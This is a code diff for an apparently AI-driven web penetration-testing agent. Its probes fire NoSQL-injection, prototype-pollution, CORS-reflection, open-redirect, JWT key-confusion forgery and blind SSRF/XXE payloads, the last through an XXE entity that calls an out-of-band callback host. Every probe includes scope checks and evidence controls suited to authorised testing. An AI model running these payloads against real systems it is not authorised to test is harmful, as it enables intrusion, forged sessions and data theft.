+            ? NOSQL_OP_OBJECTS.map((o) => ({ label: o.label, u: url, b: body.replace(/\{\{NOSQL\}\}/g, o.json) as string | null }))
+            : NOSQL_OP_QUERY.map((o) => ({ label: o.label, u: nosqlQueryUrl(url, param!, o.op, o.val), b: null as string | null }));
+          for (const op of ops) {
+            if (!op.u) continue;
+            const p1 = await fire(op.u, op.b, "positive_replay", `op ${op.label} #1`);
+            if (!p1) continue;
+            errSig = errSig ?? nosqlErrorSignature(p1.body);
+            const p2 = await fire(op.u, op.b, "positive_replay", `op ${op.label} #2`);
+            if (!p2) continue;
+            if (nosqlBypassConfirms({ status: control.status, body: control.body }, [{ status: p1.status, body: p1.body }, { status: p2.status, body: p2.body }], successMarker))
+              return txt(JSON.stringify({ technique: "operator-bypass", negativeControl: control.evId, positiveReplays: [p1.evId, p2.evId], effectMarker: successMarker ?? `status ${p1.status}`, verdict: `NoSQL OPERATOR INJECTION CONFIRMED — benign control (status ${control.status}) failed, operator ${op.label} succeeded (status ${p1.status}) twice${successMarker ? ` with marker "${successMarker}"` : ""}. record_finding(category sqli) — title it NoSQL/operator injection — with these evidenceIds + effectMarker.` }));
+          }
+          if (body != null) {
+            const baseMs = control.ms;
+            const t1 = await fire(url, body.replace(/\{\{NOSQL\}\}/g, nosqlTimeObject(3000)), "positive_replay", "$where sleep #1");
+            if (t1 && t1.ms - baseMs > 2200) {
+              const t2 = await fire(url, body.replace(/\{\{NOSQL\}\}/g, nosqlTimeObject(3000)), "positive_replay", "$where sleep #2");
+              if (t2 && t2.ms - baseMs > 2200)
+                return txt(JSON.stringify({ technique: "time-based", negativeControl: control.evId, positiveReplays: [t1.evId, t2.evId], verdict: `BLIND NoSQL INJECTION CONFIRMED ($where sleep): +${Math.round(t1.ms - baseMs)}ms x2 vs ${Math.round(baseMs)}ms baseline. record_finding(category sqli) — NoSQL — with these evidenceIds.` }));
+            }
+          }
+          return txt(JSON.stringify({ technique: null, errorSignature: errSig ?? null, verdict: errSig ? `NoSQL error signature seen ("${errSig}") — likely a Mongo/Mongoose backend, but operator/time did not confirm. Try tailored payloads via http_request (login: password={"$ne":null}; or $where).` : "not confirmed: operator payloads did not bypass and $where showed no delay. On a login form, set successMarker to the token/success string and retry." }));
+        } catch (e) {
+          return txt(`ERROR: ${String(e).slice(0, 180)}`);
+        }
+      },
+    ),
+    tool(
+      "probe_cors",
+      "Confirm a CORS misconfiguration: whether the endpoint REFLECTS an arbitrary Origin into Access-Control-Allow-Origin. Sends a control (no Origin) + an evil-origin request twice; confirms if the evil host is reflected in ACAO on the payload but NOT the control. If Access-Control-Allow-Credentials:true is also present it is HIGH (an attacker page reads the victim's AUTHENTICATED responses cross-origin); without credentials it is LOW. A static '*' is not a finding. Returns negativeControl + positiveReplays evidenceIds + effectMarker (the evil origin) → record_finding(category cors-misconfig). USE on any API endpoint, especially authed JSON APIs.",
+      { url: z.string() },
+      async ({ url }) => {
+        const evil = "https://evil.verdict-oob.example";
+        const el = evil.toLowerCase();
+        const fire = async (origin: string | null, kind: "negative_control" | "positive_replay", tag: string) => {
+          const headers = authHeaders(s);
+          if (origin) headers["origin"] = origin;
+          const req: HttpRequest = { method: "GET", url, headers, body: null };
+          if (!isInScope(req.url, s.scope)) return null;
+          const res = await s.http.send(req);
+          bumpHttp(s, res.status);
+          const ev = s.evidence.record({ screenId: s.currentScreenId ?? "pilot", validator: "claude-pilot-cors", kind, request: { ...req, headers: s.http.effectiveHeaders(req.headers) }, response: res, note: `cors ${tag}` });
+          return { evId: ev.id, acao: (res.headers["access-control-allow-origin"] ?? "").trim().toLowerCase(), acac: (res.headers["access-control-allow-credentials"] ?? "").trim().toLowerCase(), status: res.status };
+        };
+        try {
+          const control = await fire(null, "negative_control", "no-origin");
+          if (!control) return txt("BLOCKED: url out of scope.");
+          const p1 = await fire(evil, "positive_replay", "evil-origin #1");
+          const p2 = await fire(evil, "positive_replay", "evil-origin #2");
+          const reflects = (r: { acao: string } | null): boolean => !!r && r.acao === el;
+          if (p1 && p2 && reflects(p1) && reflects(p2) && !reflects(control)) {
+            const withCreds = p1.acac === "true";
+            return txt(JSON.stringify({ confirmed: true, negativeControl: control.evId, positiveReplays: [p1.evId, p2.evId], effectMarker: evil, severity: withCreds ? "high" : "low", verdict: `CORS MISCONFIG CONFIRMED — Access-Control-Allow-Origin reflects an arbitrary origin ${withCreds ? "WITH credentials (cross-origin theft of AUTHENTICATED responses = HIGH)" : "without credentials (LOW)"}. record_finding(category cors-misconfig, ${withCreds ? "high" : "low"}) with these evidenceIds + effectMarker "${evil}".` }));
+          }
+          return txt(JSON.stringify({ confirmed: false, verdict: "not confirmed: the arbitrary Origin was not reflected into Access-Control-Allow-Origin (static '*' or no ACAO is not a finding)." }));
+        } catch (e) {
+          return txt(`ERROR: ${String(e).slice(0, 180)}`);
+        }
+      },
+    ),
+    tool(
+      "probe_proto",
+      "Confirm PROTOTYPE POLLUTION (Node/Express with a deep-merge / lodash.merge sink): POSTs a JSON body that pollutes Object.prototype ({\"__proto__\":{\"<marker>\":\"<val>\"}}) — built as a RAW body so the operator keys aren't dropped — then a benign FOLLOW-UP request; confirms if the injected property LEAKS back (an inherited property serialized into the follow-up response). Point `url` at a JSON body the app merges into an object (a profile/settings/config update); `followUrl` = a benign GET whose response would echo an inherited property (defaults to `url`). Returns negativeControl + positiveReplays evidenceIds + effectMarker → record_finding(category prototype-pollution, high). USE on any JSON body an Express app merges.",
+      { url: z.string(), method: z.string().optional(), followUrl: z.string().optional(), contentType: z.string().optional() },
+      async ({ url, method, followUrl, contentType }) => {
+        const ct = contentType ?? "application/json";
+        const marker = "verdictPP9137";
+        const markerVal = marker + "VAL";
+        const pollution = `{"__proto__":{"${marker}":"${markerVal}"}}`;
+        const fu = followUrl ?? url;
+        const fire = async (u: string, b: string | null, m: string, kind: "negative_control" | "positive_replay", tag: string) => {
+          const headers = authHeaders(s);
+          if (b != null) headers["content-type"] = ct;
+          const req: HttpRequest = { method: m.toUpperCase(), url: u, headers, body: b };
+          if (!isInScope(req.url, s.scope)) return null;
+          const res = await s.http.send(req);
+          bumpHttp(s, res.status);
+          const ev = s.evidence.record({ screenId: s.currentScreenId ?? "pilot", validator: "claude-pilot-proto", kind, request: { ...req, headers: s.http.effectiveHeaders(req.headers) }, response: res, note: `proto ${tag}` });
+          return { evId: ev.id, status: res.status, body: res.body };
+        };
+        try {
+          const control = await fire(fu, null, "GET", "negative_control", "follow(before pollution)");
+          if (!control) return txt("BLOCKED: url out of scope.");
+          if (control.body.includes(markerVal)) return txt("not confirmed: the marker is ambiently present before pollution — pick a fresh followUrl.");
+          await fire(url, pollution, method ?? "POST", "positive_replay", "pollute");
+          const p1 = await fire(fu, null, "GET", "positive_replay", "follow(after) #1");
+          const p2 = await fire(fu, null, "GET", "positive_replay", "follow(after) #2");
+          const leaked = (r: { body: string } | null): boolean => !!r && r.body.includes(markerVal);
+          if (p1 && p2 && leaked(p1) && leaked(p2))
+            return txt(JSON.stringify({ confirmed: true, negativeControl: control.evId, positiveReplays: [p1.evId, p2.evId], effectMarker: markerVal, verdict: `PROTOTYPE POLLUTION CONFIRMED — after POSTing {"__proto__":{"${marker}":...}}, the injected inherited property "${markerVal}" appeared in the follow-up response (absent before). record_finding(category prototype-pollution, high) with these evidenceIds + effectMarker.` }));
+          return txt(JSON.stringify({ confirmed: false, verdict: "not confirmed: the injected __proto__ property did not leak into the follow-up. Try a gadget (__proto__.status / a config key the app reads) via http_request, or a different merge sink." }));
+        } catch (e) {
+          return txt(`ERROR: ${String(e).slice(0, 180)}`);
+        }
+      },
+    ),
+    tool(
       "probe_redirect",
-      "Confirm an OPEN REDIRECT: sets `param` to an attacker-controlled external host and checks the response redirects there (Location header → the OOB host). Sends a benign in-scope control + the external payload twice. Returns negativeControl + positiveReplays evidenceIds + the effectMarker (the OOB host), ready for record_finding(category open-redirect).",
+      "Confirm an OPEN REDIRECT: sets `param` to an attacker-controlled external host and checks the response redirects there (Location header → the OOB host). If the param's CURRENT value WRAPS a URL (base64 or percent-encoded — e.g. a SSO_ORIG_URI / returnUrl / next return-URL), the payload is RE-ENCODED in the same wrapper so the decoded sink is actually reached. Sends a benign in-scope control + the external payload twice. Returns negativeControl + positiveReplays evidenceIds + the effectMarker (the OOB host), ready for record_finding(category open-redirect).",
       { url: z.string(), param: z.string() },
       async ({ url, param }) => {
         const marker = OOB_MARKER;
@@ -2448,9 +2703,14 @@ export function buildTools(s: PilotSession) {
         let p1: Awaited<ReturnType<typeof send>>;
         let p2: Awaited<ReturnType<typeof send>>;
         try {
+          // If the param's current value WRAPS a URL (base64/percent — the SSO_ORIG_URI shape), inject the OOB host
+          // RE-ENCODED in the same wrapper; a raw payload would be decoded to garbage and never reach the redirect sink.
+          const cur = ((): string => { try { return new URL(url).searchParams.get(param) ?? ""; } catch { return ""; } })();
+          const wrapper = detectUrlWrapper(cur);
+          const payloadVal = wrapper ? wrapper.rewrap(`https://${marker}/`) : `https://${marker}/`;
           ctrl = await send("/account", "negative_control", "control(in-scope path)");
-          p1 = await send(`https://${marker}/`, "positive_replay", "payload #1");
-          p2 = await send(`https://${marker}/`, "positive_replay", "payload #2");
+          p1 = await send(payloadVal, "positive_replay", wrapper ? `payload #1 (${wrapper.kind}-wrapped)` : "payload #1");
+          p2 = await send(payloadVal, "positive_replay", wrapper ? `payload #2 (${wrapper.kind}-wrapped)` : "payload #2");
         } catch (e) {
           return txt(`ERROR: ${String(e).slice(0, 180)}`);
         }
@@ -2475,16 +2735,35 @@ export function buildTools(s: PilotSession) {
     ),
     tool(
       "probe_jwt",
-      "Confirm a JWT forgery: (1) weak HMAC secret — cracks the live Bearer against a small default-secret wordlist (secret, jwt-secret, empty, …) and mints a new token; (2) alg:none / None / NONE (signature not verified). Requires login() so the session holds a Bearer JWT. Replays each candidate against an identity-returning authed `url`; garbage token is the negative control (must be rejected) and the forged token is sent twice (if accepted = the server took a token we minted). Returns negativeControl + positiveReplays evidenceIds → record_finding(category session). Optionally mutate a claim via `claimKey`/`claimValue` to also prove privilege escalation. Does not cover jku/x5u or kid injection.",
-      { url: z.string(), claimKey: z.string().optional(), claimValue: z.string().optional() },
-      async ({ url, claimKey, claimValue }) => {
+      "Confirm a JWT forgery: (1) weak HMAC secret — cracks the live Bearer against a small default-secret wordlist and mints a new token; (2) alg:none / None / NONE (signature not verified); (3) RS256->HS256 KEY CONFUSION — if the token is RS/PS/ES-signed, fetches the JWKS (jwksUrl or /.well-known/jwks.json) and re-signs the token as HS256 using the RSA PUBLIC KEY as the HMAC secret (a naive verifier accepts it → admin forgery). Requires login() so the session holds a Bearer JWT. Replays each candidate against an identity-returning authed `url`; garbage token is the negative control (must be rejected) and the forged token is sent twice (accepted = the server took a token we minted). Returns negativeControl + positiveReplays evidenceIds → record_finding(category session). Optionally mutate a claim via `claimKey`/`claimValue` for privilege escalation. Does not cover jku/x5u or kid injection.",
+      { url: z.string(), claimKey: z.string().optional(), claimValue: z.string().optional(), jwksUrl: z.string().optional() },
+      async ({ url, claimKey, claimValue, jwksUrl }) => {
         if (!s.currentBearer) return txt("no Bearer JWT in the current session — login(role) first (this probe forges from the live token).");
         if (!isInScope(url, s.scope)) return txt(`BLOCKED: ${url} is out of scope`);
         const mutate = (c: Record<string, unknown>): void => {
           bumpJwtExp(c);
           if (claimKey) c[claimKey] = claimValue ?? "admin";
         };
-        const candidates = jwtForgeCandidates(s.currentBearer, mutate);
+        // RS256->HS256 key confusion needs the RSA public key — fetch the JWKS when the token is asymmetric-signed.
+        let publicKeyPem: string | undefined;
+        const hdrAlg = ((): string => { const pj = parseJwt(s.currentBearer); return pj && typeof pj.header.alg === "string" ? pj.header.alg.trim().toUpperCase() : ""; })();
+        if (/^(?:RS|PS|ES)(?:256|384|512)$/.test(hdrAlg)) {
+          const jwksTries: string[] = [];
+          if (jwksUrl) jwksTries.push(jwksUrl);
+          try { jwksTries.push(new URL("/.well-known/jwks.json", url).toString()); } catch { /* bad url */ }
+          for (const ju of jwksTries) {
+            if (!isInScope(ju, s.scope)) continue;
+            try {
+              const res = await s.http.send({ method: "GET", url: ju, headers: authHeaders(s), body: null });
+              bumpHttp(s, res.status, { active: false });
+              if (res.status < 400 && res.body.includes("\"keys\"")) {
+                const pem = pemFromJwks(res.body);
+                if (pem) { publicKeyPem = pem; break; }
+              }
+            } catch { /* fetch failed — skip this jwks url */ }
+          }
+        }
+        const candidates = jwtForgeCandidates(s.currentBearer, mutate, publicKeyPem ? { publicKeyPem } : {});
         if (candidates.length === 0) return txt("could not parse the current Bearer token as a JWT (header.payload.signature).");
         const send = async (bearer: string, kind: "negative_control" | "positive_replay", tag: string) => {
           const req: HttpRequest = { method: "GET", url, headers: { ...authHeaders(s), authorization: `Bearer ${bearer}` }, body: null };
@@ -2615,7 +2894,7 @@ export function buildTools(s: PilotSession) {
     ),
     tool(
       "probe_secrets",
-      "Confirm a SECRET or INFO DISCLOSURE at `url` (a page, /.env, /actuator/env, a backup, a stack-trace error). GETs a non-existent control path (must be clean) then `url` twice. Hits the impact oracle (keys, private key, .env, passwd) → record_finding(secret-exposure); or phpinfo / directory listing / stack trace → record_finding(info-disclosure). Ambient copies already in the 404 control are ignored. Returns negativeControl + positiveReplays + effectMarker.",
+      "Confirm a SECRET or INFO DISCLOSURE at `url` (a page, /.env, /actuator/env, a backup, a stack-trace error). GETs a non-existent control path (must be clean) then `url` twice. Hits the impact oracle (keys, private key, .env, passwd) → record_finding(secret-exposure); or phpinfo / directory listing / stack trace → record_finding(info-disclosure). Maps JS keys, Firebase web apiKeys, and reCAPTCHA site keys are public by design — not a hit. robots.txt / sitemap.xml are public files — not info-disclosure. Ambient copies already in the 404 control are ignored. Returns negativeControl + positiveReplays + effectMarker.",
       { url: z.string() },
       async ({ url }) => {
         if (!isInScope(url, s.scope)) return txt(`BLOCKED: ${url} is out of scope`);
@@ -2681,7 +2960,7 @@ export function buildTools(s: PilotSession) {
         const fire = async (kind: "negative_control" | "positive_replay", tag: string) => {
           const req: HttpRequest = { method: "GET", url, headers: authHeaders(s), body: null };
           const res = await s.http.send(req);
-          bumpHttp(s, res.status);
+          bumpHttp(s, res.status, { active: false }); // passive hygiene check — does NOT satisfy the coverage gate
           const ev = s.evidence.record({
             screenId: s.currentScreenId ?? "pilot",
             validator: "claude-pilot-headers",
@@ -2690,11 +2969,19 @@ export function buildTools(s: PilotSession) {
             response: res,
             note: `headers ${tag}`,
           });
-          return { evId: ev.id, status: res.status, headers: res.headers };
+          return { evId: ev.id, status: res.status, headers: res.headers, body: res.body };
         };
         try {
           const a = await fire("negative_control", "#1");
           const b = await fire("positive_replay", "#2");
+          if (looksLikeProxyError(a.body ?? "")) {
+            return txt(
+              JSON.stringify({
+                verdict:
+                  "NOT CONFIRMED: the response is an upstream proxy/connection error page (host unreachable through the proxy), NOT the target — the host was never actually reached. Do NOT record header findings on it. Move on (or retry without --burp-proxy).",
+              }),
+            );
+          }
           const lc: Record<string, string> = {};
           for (const [k, v] of Object.entries(a.headers ?? {})) lc[k.toLowerCase()] = v;
           const missing = auditHeaders(lc, url);
@@ -2931,17 +3218,18 @@ export function buildTools(s: PilotSession) {
     ),
     tool(
       "probe_oob",
-      "Confirm a BLIND / out-of-band vuln via Burp Collaborator: blind SSRF, blind XXE, blind SQLi (DNS/HTTP exfil), OS command injection, header SSRF (X-Forwarded-Host / Referer / Host), email/webhook SSRF — anything where the EFFECT is the SERVER making an external request, not a visible response. Requires the VERDICT Audit REST extension with Collaborator enabled (BURP_AUDIT_API). Put a {{OOB}} placeholder where the callback host belongs (a URL field, an XXE SYSTEM entity `<!ENTITY x SYSTEM \"http://{{OOB}}/\">`, a hostname, a header value, OR inside an uploaded file's text content — see `files`). The tool generates a unique Collaborator host, injects it (in-scope target request), and polls ~waitSec for a DNS/HTTP/SMTP callback FROM the target; a callback = the server reached our host out-of-band = confirmed. FILE-BORNE OOB: for a blind SSRF/XXE that must live INSIDE an uploaded file (FFmpeg/HLS video-SSRF, ImageMagick, an uploaded SVG/DOCX with a SYSTEM entity), pass `files` (each {name, filename, contentType?, and `content` text OR `base64` bytes}) with {{OOB}} in a file's text `content` — it is sent as multipart/form-data and the callback confirms the file-borne case. Records a benign control + the injected request → negativeControl + positiveReplays evidenceIds for record_finding(category ssrf / rce as appropriate). NOTE: callbacks can lag seconds; nothing back after waitSec = not confirmed (try other params/headers/schemes).",
+      "Confirm a BLIND / out-of-band vuln via Interactsh or Burp Collaborator: blind SSRF, blind XXE, blind SQLi (DNS/HTTP exfil), OS command injection, header SSRF (X-Forwarded-Host / Referer / Host), email/webhook SSRF — anything where the EFFECT is the SERVER making an external request, not a visible response. Requires OOB enabled (Settings → OOB → Interactsh, or BURP_AUDIT_API + Collaborator). Put a {{OOB}} placeholder where the callback host belongs (a URL field, an XXE SYSTEM entity `<!ENTITY x SYSTEM \"http://{{OOB}}/\">`, a hostname, a header value, OR inside an uploaded file's text content — see `files`). The tool generates a unique callback host, injects it (in-scope target request), and polls ~waitSec for a DNS/HTTP/SMTP callback FROM the target; a callback = the server reached our host out-of-band = confirmed. FILE-BORNE OOB: for a blind SSRF/XXE that must live INSIDE an uploaded file (FFmpeg/HLS video-SSRF, ImageMagick, an uploaded SVG/DOCX with a SYSTEM entity), pass `files` (each {name, filename, contentType?, and `content` text OR `base64` bytes}) with {{OOB}} in a file's text `content` — it is sent as multipart/form-data and the callback confirms the file-borne case. Records a benign control + the injected request → negativeControl + positiveReplays evidenceIds for record_finding(category ssrf / rce as appropriate). NOTE: callbacks can lag seconds; nothing back after waitSec = not confirmed (try other params/headers/schemes).",
       { method: z.string(), url: z.string(), headers: z.record(z.string()).optional(), body: z.string().nullable().optional(), files: z.array(z.object({ name: z.string(), filename: z.string(), contentType: z.string().optional(), content: z.string().optional(), base64: z.string().optional() })).optional(), waitSec: z.number().optional(), note: z.string().optional() },
       async ({ method, url, headers, body, files, waitSec, note }) => {
-        if (!s.oob) return txt("OOB NOT AVAILABLE: set BURP_AUDIT_API (+ enable Collaborator in Burp) to use probe_oob. Without it, blind SSRF/XXE/SQLi cannot be confirmed out-of-band.");
+        if (!s.oob) return txt("OOB NOT AVAILABLE: enable OOB in Settings (Interactsh) or set BURP_AUDIT_API (Burp Collaborator). Without it, blind SSRF/XXE/SQLi cannot be confirmed out-of-band. In-band probe_ssrf still applies.");
+        const oob = s.oob;
         const inPlaceholder = url.includes("{{OOB}}") || (body?.includes("{{OOB}}") ?? false) || Object.values(headers ?? {}).some((v) => v.includes("{{OOB}}")) || filesHaveOobPlaceholder(files, "{{OOB}}");
         if (!inPlaceholder) return txt("ERROR: put a {{OOB}} placeholder where the callback host should be injected (in url, body, a header value, or an uploaded file's text content via `files`).");
         let payload: { host: string; id: string };
         try {
-          payload = await oobPayload(s.oob);
+          payload = await oob.payload();
         } catch (e) {
-          return txt(`OOB error: ${String(e).slice(0, 160)} (is the extension up and Collaborator enabled in Burp's project settings?)`);
+          return txt(`OOB error: ${String(e).slice(0, 160)} (is Interactsh reachable, or Collaborator enabled in Burp?)`);
         }
         const startTs = Date.now();
         const sub = (v: string, host: string): string => v.replace(/\{\{OOB\}\}/g, host);
@@ -2971,24 +3259,28 @@ export function buildTools(s: PilotSession) {
         try {
           // negative control: コールバックしない良性ホストを注入(interaction が出ないこと)。
           controlEv = await inject(`verdict-oob-noref-${payload.id.slice(0, 8)}.invalid`, "negative_control", "control: benign host, no callback expected");
-          // 本注入: collaborator host を埋めて送信。
-          await inject(payload.host, "positive_replay", `injected Collaborator host ${payload.host} (id ${payload.id}); polling for callback…`);
+          // 本注入: OOB host を埋めて送信。
+          await inject(payload.host, "positive_replay", `injected OOB host ${payload.host} (id ${payload.id}); polling for callback…`);
         } catch (e) {
           return txt(`ERROR: ${String(e).slice(0, 160)}`);
         }
-        // コールバックは非同期(秒〜)。waitSec まで数秒おきにポーリング。
-        const budgetMs = Math.min(Math.max(waitSec ?? 20, 5), 45) * 1000;
+        // コールバックは非同期(秒〜)。即ポーリングしてから waitSec まで数秒おきに。
+        const budgetMs = Math.min(Math.max(waitSec ?? 20, 1), 45) * 1000;
         const sleep = (ms: number): Promise<void> => new Promise((r) => setTimeout(r, ms));
-        let hits: Awaited<ReturnType<typeof oobPoll>> = [];
+        let hits: Awaited<ReturnType<typeof oob.poll>> = [];
+        let lastPollErr = "";
         const t0 = Date.now();
         while (Date.now() - t0 < budgetMs) {
-          await sleep(3000);
           try {
-            hits = await oobPoll(s.oob, { since: startTs, id: payload.id });
-          } catch {
-            /* keep polling */
+            hits = await oob.poll({ since: startTs, id: payload.id });
+            lastPollErr = "";
+          } catch (e) {
+            lastPollErr = String(e instanceof Error ? e.message : e).slice(0, 160);
           }
           if (hits.length > 0) break;
+          const remain = budgetMs - (Date.now() - t0);
+          if (remain <= 0) break;
+          await sleep(Math.min(3000, remain));
         }
         const confirmed = hits.length > 0;
         const summary = confirmed ? hits.map((h) => `${h.type}@${new Date(h.time).toISOString()}${h.clientIp ? ` from ${h.clientIp}` : ""}`).join("; ") : `no callback within ${Math.round(budgetMs / 1000)}s`;
@@ -2996,7 +3288,7 @@ export function buildTools(s: PilotSession) {
         // positive の evidence body は **固定の長文(host 込み)** にする。ssrf/rce は非マーカー判定(checkEvidenceDiscipline)で
         // control との body 長差 >64 が要るため、confirmed 時は control より常時十分長くなるようにして取りこぼしを防ぐ。
         const resBody = confirmed
-          ? `OUT-OF-BAND CALLBACK CONFIRMED — the target server issued an external ${hits.map((h) => h.type).join("/")} request to our unique Burp Collaborator host, which proves a blind out-of-band vulnerability (SSRF / XXE / blind SQLi / RCE depending on the sink). collaborator_host=${payload.host} payload_id=${payload.id} interactions=[${summary}]`
+          ? `OUT-OF-BAND CALLBACK CONFIRMED — the target server issued an external ${hits.map((h) => h.type).join("/")} request to our unique OOB host, which proves a blind out-of-band vulnerability (SSRF / XXE / blind SQLi / RCE depending on the sink). oob_host=${payload.host} payload_id=${payload.id} provider=${oob.kind} interactions=[${summary}]`
           : `no out-of-band callback within ${Math.round(budgetMs / 1000)}s for ${payload.host}`;
         const p1 = await inject(payload.host, "positive_replay", `${resBody} [read#1]`).catch(() => "");
         const p2 = await inject(payload.host, "positive_replay", `${resBody} [read#2]`).catch(() => "");
@@ -3005,11 +3297,15 @@ export function buildTools(s: PilotSession) {
             negativeControl: controlEv,
             positiveReplays: [p1, p2].filter(Boolean),
             effectMarker: payload.host,
+            oobHost: payload.host,
             collaboratorHost: payload.host,
+            provider: oob.kind,
             interactions: hits,
             verdict: confirmed
-              ? `OOB CONFIRMED — the target made ${hits.length} out-of-band ${hits.map((h) => h.type).join("/")} request(s) to our Collaborator host. record_finding(ssrf / rce / xxe as fits the sink) with these evidenceIds + effectMarker (the callback host).`
-              : `not confirmed: no Collaborator callback within ${Math.round(budgetMs / 1000)}s. The sink may be filtered, the response not blind, or the callback slow — try another param/header (X-Forwarded-Host, Referer), scheme (http/dns/gopher), or a longer waitSec.`,
+              ? `OOB CONFIRMED — the target made ${hits.length} out-of-band ${hits.map((h) => h.type).join("/")} request(s) to our callback host. record_finding(ssrf / rce / xxe as fits the sink) with these evidenceIds + effectMarker (the callback host).`
+              : lastPollErr
+                ? `not confirmed: OOB poll error (${lastPollErr}). The callback channel may be misconfigured — check Settings → OOB / Interactsh reachability, or BURP_AUDIT_API.`
+                : `not confirmed: no OOB callback within ${Math.round(budgetMs / 1000)}s. The sink may be filtered, the response not blind, or the callback slow — try another param/header (X-Forwarded-Host, Referer), scheme (http/dns/gopher), or a longer waitSec.`,
           }),
         );
       },
@@ -3355,7 +3651,7 @@ export function buildTools(s: PilotSession) {
             fetched,
             components,
             inventory: formatTechInventory(components),
-            note: "Versions only. Each fetched URL has an evidenceId (the banner that revealed the version). Assess each (component, version) against KNOWN CVEs/EOL; the ⚠ KNOWN marks are deterministic JS-library matches. For a SERIOUS known CVE (High/Critical, exploitable class), record it as verdict:'suspected' citing the evidenceId.",
+            note: "Versions only. Each fetched URL has an evidenceId (the banner that revealed the version). Assess each (component, VERSION) against KNOWN CVEs. Skip components with version unknown — a product-family banner (Server: BigIP, APM/VPN cookies) plus historical CVEs that may apply is NOT a finding. The ⚠ KNOWN marks are deterministic JS-library matches. For a SERIOUS known CVE (High/Critical, exploitable class) on a MATCHED version, record verdict:'suspected' citing the evidenceId.",
           }),
         );
       },
@@ -3522,9 +3818,25 @@ export function buildTools(s: PilotSession) {
           //    vulnerable-component is exempt: a version banner is proven by IDENTIFICATION, not a differential (its own
           //    High/Critical-CVE gate above is the substance check).
           const obsRec = s.evidence.records.find((r) => r.id === observation)!;
+          if (category === "secret-exposure" && isPublicByDesignClientCredential(obsRec.response.body))
+            return txt("REJECTED: client credential is public by design (Maps JS key, Firebase web apiKey, or reCAPTCHA site key). Not a suspected secret. Do not record.");
+          if ((category === "idor" || category === "idor-write") && classifyCrossUserBody(obsRec.response.body).class === "public-directory")
+            return txt("REJECTED: observation is a PUBLIC DIRECTORY (tenant people-picker, or a store/location/dealer locator). Typically intended, not IDOR — suspected or confirmed. Mark idor tested-clean unless the body also has a person's phone/home address/SSN/DOB, another tenant's private object, or order/hold/document contents.");
+          if (
+            category === "vulnerable-component" &&
+            isVersionlessComponentLead(`${title}\n${anomaly ?? ""}\n${description}`, obsRec.response.headers, obsRec.response.body)
+          )
+            return txt("REJECTED: a suspected vulnerable-component lead requires a CONCRETE VERSION in the cited response that the writeup actually names (Server/X-Powered-By/MicrosoftSharePointTeamServices/meta generator/script src). A product-family banner (server: BigIP), a SharePoint hive path (/_layouts/15/, corev15.css — not SharePoint 2013), or historical CVEs that may apply depending on patch level is not a finding. Skip. If you later exploit a specific CVE, record that class confirmed.");
           const ctrlRec = negativeControl ? s.evidence.records.find((r) => r.id === negativeControl) : undefined;
           if (category !== "vulnerable-component") {
-            const differs = observationDiffersFromControl(ctrlRec ? { status: ctrlRec.response.status, body: ctrlRec.response.body } : undefined, { status: obsRec.response.status, body: obsRec.response.body }, effectMarker);
+            let differs = observationDiffersFromControl(ctrlRec ? { status: ctrlRec.response.status, body: ctrlRec.response.body } : undefined, { status: obsRec.response.status, body: obsRec.response.body }, effectMarker);
+            // Injection/execution classes: a bare body-length delta between two pages does NOT count — require a marker
+            // present only in the observation, or a status flip (kills the "two different pages differ by >64B" fake SSRF/SQLi).
+            if (differs && MARKER_REQUIRED_SUSPECT_CATEGORIES.has(category)) {
+              const markerHit = !!effectMarker && obsRec.response.body.includes(effectMarker) && !(ctrlRec && ctrlRec.response.body.includes(effectMarker));
+              const statusFlip = !!ctrlRec && ctrlRec.response.status !== obsRec.response.status;
+              differs = markerHit || statusFlip;
+            }
             const carriesImpact = impactOracle(obsRec.response.body).length > 0;
             // Session glance: the anomaly lives in the REQUEST (Cookie / Authorization), not a response differential.
             const sessionGlance = category === "session" && obsRec.validator === "claude-pilot-session";
@@ -3563,7 +3875,7 @@ export function buildTools(s: PilotSession) {
           // XSS は「live HTML 位置での反射」= 実行可能文脈のみ有効(<script>/flight-data JSON 内の反射は不活性 → refute)。
           const isXss = category === "xss-reflected" || category === "xss-stored";
           const isRedirect = category === "open-redirect";
-          const allowNon2xx = isXss || category === "user-enumeration" || category === "secret-exposure" || category === "info-disclosure" || category === "ssrf" || category === "xxe";
+          const allowNon2xx = isXss || category === "user-enumeration" || category === "secret-exposure" || category === "info-disclosure" || category === "ssrf" || category === "xxe" || category === "path-traversal";
           const hasMarker = (r: { body: string; headers: Record<string, string>; finalUrl?: string }): boolean =>
             isXss
               ? reflectionIsLive(r.body, effectMarker)
@@ -3576,12 +3888,18 @@ export function buildTools(s: PilotSession) {
             { requireSuccess: !allowNon2xx },
           );
           if (!verdict.ok) return txt(`REJECTED (logic evidence): ${verdict.reason}.`);
+          if (category === "secret-exposure" && posRecs.every((r) => isPublicByDesignClientCredential(r!.response.body, effectMarker)))
+            return txt("REJECTED: client credential is public by design (Maps JS key in maps.googleapis.com/maps/api/js, Firebase web apiKey, or reCAPTCHA site key). Restricted in the vendor console, not by hiding the key. Not secret-exposure. Do not record.");
+          if (category === "info-disclosure" && posRecs.every((r) => looksLikePublicWebFile(r!.response.body)))
+            return txt("REJECTED: robots.txt / sitemap.xml are public files by design. A Sitemap: line (including one pointing at production from a test host) is not info-disclosure. Do not record.");
         } else if (category === "headers") {
           // Absence class: two stable GETs of the same URL. The issue is a missing header, so control and positives
           // are allowed to be the same response (CLI header-audit works the same way). Still require the cited
           // responses to actually miss the checked header (param = rule key, e.g. csp).
           if (posRecs.length < 2) return txt("REJECTED: headers requires >=2 GET evidenceIds (probe_headers).");
           const p0 = posRecs[0]!;
+          if (looksLikeProxyError(p0.response.body))
+            return txt("REJECTED: the cited response is an upstream proxy/connection error page (host unreachable through the proxy), not the target — the host was never actually reached. Do not record header findings on it.");
           if (!posRecs.every((r) => r!.response.status === p0.response.status))
             return txt("REJECTED: header-audit replays disagree (unstable).");
           const hdrLc: Record<string, string> = {};
@@ -3591,12 +3909,28 @@ export function buildTools(s: PilotSession) {
           if (param && !missing.some((r) => r.key === param || r.header === param.toLowerCase()))
             return txt(`REJECTED: '${param}' is present (or not a checked rule). Missing: ${missing.map((r) => r.key).join(", ")}.`);
         } else if (category !== "auth-bypass") {
-          const verdict = checkEvidenceDiscipline(
-            { status: negRec.response.status, bodyLen: negRec.response.body.length },
-            posRecs.map((r) => ({ status: r!.response.status, bodyLen: r!.response.body.length })),
-          );
-          if (!verdict.ok)
-            return txt(`REJECTED (evidence discipline): ${verdict.reason}. Get a negative control that fails + >=2 stable positive replays, then record.`);
+          if (category === "sqli" && sqliHtmlLengthOnlyFp(negRec.response.body, posRecs.map((r) => r!.response.body), negRec.response.status, posRecs.map((r) => r!.response.status)))
